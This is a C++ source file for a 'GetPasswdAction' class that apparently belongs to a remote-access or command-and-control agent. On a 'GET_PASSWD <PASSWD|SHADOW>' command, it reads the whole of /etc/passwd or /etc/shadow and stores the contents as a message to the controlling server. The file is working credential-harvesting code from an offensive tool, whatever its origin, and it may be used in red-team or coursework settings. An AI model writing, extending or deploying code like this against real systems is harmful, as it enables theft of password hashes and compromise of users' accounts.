#include "GetPasswdAction.hpp"

#include <iostream>
#include <fstream>
#include <string>

bool isValidFileType(const char* cString) {
    if (GeneralUtils::cStrAreEqual(cString, "PASSWD")) {
        return true;
    } else if (GeneralUtils::cStrAreEqual(cString, "SHADOW")) {
        return true;
    }
    return false;
}

GetPasswdAction::GetPasswdAction(const std::vector<std::string>& actionParams) 
    : actionParams(actionParams) {
        this->msgToServer = "";
        this->checkParams();
}

ActionType GetPasswdAction::getActionType() {
    return ActionType::GET_PASSWD;
}

std::string GetPasswdAction::getMessage() {
    return msgToServer;
}

void GetPasswdAction::execute() {
    if (!isValid) {
        return;
    }
    std::string filepath = "/etc/shadow";

    if (GeneralUtils::cStrAreEqual(actionParams[FILE_TYPE_IDX].c_str(), "PASSWD")) {
        filepath = "/etc/passwd";
    } else if (GeneralUtils::cStrAreEqual(actionParams[FILE_TYPE_IDX].c_str(), "SHADOW")) {
        filepath = "/etc/shadow";
    } else {
        filepath = ""; // SHOULD NEVER BE HIT
    }
    std::string fileContent = getFileContents(filepath);
    this->msgToServer = fileContent;
}

std::string GetPasswdAction::getFileContents(std::string& filePath) {
    std::ifstream file(filePath, std::ios::in | std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Unable to open file: " << filePath << std::endl;
        return "";
    }

    // Read the entire file into a string
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    file.close(); // Close the file
    return content;
}

/*
    GET_PASSWD Command Syntax:
        GET_PASSWD <PASSWD|SHADOW>
*/
void GetPasswdAction::checkParams() {
    if (actionParams.size() - 3 != PARAM_COUNT) {
        isValid = false;
        return;
    }

    if (!isValidFileType(actionParams[FILE_TYPE_IDX].c_str())) {
        isValid = false;
        return;
    }

    isValid = true;
}